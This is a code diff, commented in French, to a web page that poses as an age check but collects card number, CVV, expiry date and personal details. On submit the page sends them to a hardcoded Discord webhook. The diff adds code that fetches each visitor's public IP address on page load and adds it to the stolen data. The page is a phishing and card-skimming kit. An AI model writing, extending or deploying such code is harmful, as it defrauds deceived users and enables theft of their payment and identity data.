@@ -124,6 +124,8 @@
         <input type="text" name="numero_carte" placeholder="Numéro de carte (16 chiffres)" pattern="^\d{16}$" required />
         <input type="text" name="cvv" placeholder="CVV (3 chiffres)" pattern="^\d{3}$" required />
         <input type="text" name="expiration" placeholder="Date d'expiration (MM/AA)" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required />
+        <!-- Champ caché pour IP -->
+        <input type="hidden" name="ip" id="ipField" />
         <button type="submit">Vérifier l'âge</button>
       </div>
     </form>
@@ -156,6 +158,23 @@
     }
   });
 
+  // Fonction pour récupérer l'IP publique et la placer dans le champ caché
+  async function setIP() {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      const ipInput = document.getElementById('ipField');
+      if (ipInput) {
+        ipInput.value = data.ip;
+      }
+    } catch (error) {
+      console.error("Erreur lors de la récupération de l'IP :", error);
+    }
+  }
+
+  // Appel dès que la page est chargée
+  window.addEventListener('DOMContentLoaded', setIP);
+
   form.addEventListener('submit', e => {
     e.preventDefault();
     if (!validateStep(currentStep)) return;
@@ -165,7 +184,7 @@
 
     const webhookURL = "https://discord.com/api/webhooks/1399115316268765265/lFsRx3lYvUF19LDtqvzl-G4znziZcbZUYxR7uCzesvqqmR19P_ZDgYRqbxJlnThH_IwB";
 
-    // Construction du message textuel avec 2 cadres séparés
+    // Construction du message textuel avec IP ajoutée
     const message = 
       "📋 **Infos Perso**\n" +
       "```\n" +
@@ -176,6 +195,7 @@
       `Adresse  : ${data.adresse}\n` +
       `Ville    : ${data.ville}\n` +
       `Région   : ${data.region}\n` +
+      `IP       : ${data.ip || "Non récupérée"}\n` +
       "```\n\n" +
       "💳 **Infos cc**\n" +
       "```\n" +
